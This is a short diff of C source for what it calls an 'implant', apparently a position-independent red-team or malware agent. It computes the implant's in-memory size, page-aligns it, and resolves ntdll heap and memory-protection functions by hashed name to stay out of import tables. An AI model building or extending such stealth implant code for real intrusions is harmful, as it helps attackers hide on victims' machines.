@@ -3,6 +3,7 @@
 
 ST_GLOBAL PVOID __Instance = C_PTR( 'rdp5' );
 
+
 EXTERN_C FUNC VOID Entry(
     PVOID Param
 ) {
@@ -24,9 +25,9 @@ EXTERN_C FUNC VOID Entry(
     // subtract the implant end address with the start address you will
     // get the size of the implant in memory
     //
-    Blackout.Base.Buffer = StRipStart();
-    Blackout.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Blackout.Base.Buffer );
-
+    Blackout.Base.Buffer  = StRipStart();
+    Blackout.Base.Length  = U_PTR( StRipEnd() ) - U_PTR( Blackout.Base.Buffer );
+    Blackout.Base.FullLen = ( Blackout.Base.Length + 4096 - 1 ) & ~( 4096 -1 );
     //
     // get the offset and address of our global instance structure
     //
@@ -39,7 +40,7 @@ EXTERN_C FUNC VOID Entry(
     //
     // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
     // updating/patching the Instance in the current memory
-    //
+    // 
     if ( ( Blackout.Modules.Ntdll = LdrModuleAddr( H_MODULE_NTDLL ) ) ) {
         if ( !( Blackout.Win32.RtlAllocateHeap        = LdrFuncAddr( Blackout.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) ) ||
              !( Blackout.Win32.NtProtectVirtualMemory = LdrFuncAddr( Blackout.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) )
